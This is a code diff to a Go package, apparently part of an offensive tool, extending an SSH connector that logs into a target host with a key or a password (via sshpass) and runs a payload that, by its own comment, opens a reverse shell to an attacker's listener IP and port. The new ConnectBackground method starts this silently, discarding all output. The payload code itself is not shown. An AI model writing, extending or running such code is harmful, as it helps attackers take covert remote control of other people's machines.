@@ -2,8 +2,10 @@ package internal
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 )
 
@@ -11,6 +13,7 @@ import (
 type SSHConnector struct {
 	ListenerIP   string
 	ListenerPort int
+	lookPath     func(string) (string, error)
 }
 
 // NewSSHConnector creates a new SSH connector
@@ -18,7 +21,37 @@ func NewSSHConnector(ip string, port int) *SSHConnector {
 	return &SSHConnector{
 		ListenerIP:   ip,
 		ListenerPort: port,
+		lookPath:     exec.LookPath,
 	}
+}
+
+func (s *SSHConnector) buildCommand(args SSHArgs) (*exec.Cmd, error) {
+	payload := s.generatePayload()
+	baseArgs := []string{"-T", "-p", strconv.Itoa(args.Port)}
+
+	if args.KeyPath != "" {
+		sshArgs := append(baseArgs, "-i", args.KeyPath, args.Target, payload)
+		return exec.Command("ssh", sshArgs...), nil
+	}
+
+	if _, err := s.lookPath("sshpass"); err != nil {
+		return nil, fmt.Errorf("sshpass not found in PATH")
+	}
+	sshArgs := append([]string{"-e", "ssh"}, append(baseArgs, args.Target, payload)...)
+	cmd := exec.Command("sshpass", sshArgs...)
+	cmd.Env = append(os.Environ(), "SSHPASS="+args.Password)
+	return cmd, nil
+}
+
+func (s *SSHConnector) ConnectBackground(args SSHArgs) error {
+	cmd, err := s.buildCommand(args)
+	if err != nil {
+		return err
+	}
+	cmd.Stdin = nil
+	cmd.Stdout = io.Discard
+	cmd.Stderr = io.Discard
+	return cmd.Start()
 }
 
 // Connect establishes SSH connection and executes reverse shell payload
